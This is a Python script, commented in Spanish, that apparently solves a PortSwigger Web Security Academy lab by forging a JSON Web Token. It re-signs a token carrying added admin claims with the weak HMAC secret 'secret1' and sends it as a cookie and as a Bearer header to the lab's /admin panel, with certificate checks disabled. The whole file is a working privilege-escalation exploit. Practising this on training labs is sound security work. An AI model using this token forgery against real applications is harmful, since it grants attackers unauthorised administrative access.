#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests, base64, hmac, hashlib, json, time

jwt_original = "eyJraWQiOiIwOTg0MzBhMS1iOGI4LTQxNWEtYjZhNi0zYzczZTA5OGUyZTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5Mzg0Mjc4MSwic3ViIjoid2llbmVyIn0.z0WJz4TLasLJ1hSGj2ChlsVJJKi7L41VdDj96KujCEU"

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

def b64url_encode(data):
    if isinstance(data, bytes):
        encoded = base64.urlsafe_b64encode(data)
    else:
        encoded = base64.urlsafe_b64encode(data.encode('utf-8'))
    return encoded.decode('utf-8').rstrip('=')

parts = jwt_original.split('.')
header_b64, payload_b64, sig_b64 = parts[0], parts[1], parts[2]
header = b64url_decode(header_b64)

# COMIENZO DEL CAMBIO CRÍTICO: Usar exp fijo en lugar de time()
admin_payload = {
    "iss": "portswigger",       # Igual que el original
    "exp": 1793842781,          # <--- VALOR EXACTO DEL TOKEN ORIGINAL (OBLIGATORIO)
    "sub": "wiener",
    "admin": True,
    "role": "admin",
    "iat": 1739528043           # Fecha de emisión (también del original)
}
# FIN DEL CAMBIO CRÍTICO

new_header = {"alg": header.get('alg', 'HS256'), "typ": "JWT"}
new_header_str = json.dumps(new_header, separators=(',', ':'))
new_header_b64 = b64url_encode(new_header_str)

payload_str = json.dumps(admin_payload, separators=(',', ':'))
payload_b64_new = b64url_encode(payload_str)

signing_input = f"{new_header_b64}.{payload_b64_new}"
signature = hmac.new('secret1'.encode(), signing_input.encode(), hashlib.sha256).digest()
new_signature = b64url_encode(signature)

admin_token = f"{new_header_b64}.{payload_b64_new}.{new_signature}"

print(f"Token generado: {admin_token}")

# Probar
url = "https://0a41006604ce9bdc83ab0f1500bf00e0.web-security-academy.net/admin"
resp1 = requests.get(url, cookies={"session": admin_token}, timeout=10, verify=False)
resp2 = requests.get(url, headers={"Authorization": f"Bearer {admin_token}"}, timeout=10, verify=False)

print(f"\nCookie status: {resp1.status_code}")
print(f"Cookie body: {resp1.text[:200]}")
print(f"\nHeader status: {resp2.status_code}")
print(f"Header body: {resp2.text[:200]}")

if resp1.status_code == 200 or resp2.status_code == 200:
    print("\n[+] ¡ÉXITO! Accesso concedido al panel de administración")
else:
    print("\n[-] Aún denegado. Verifique que el token fue generado correctamente")
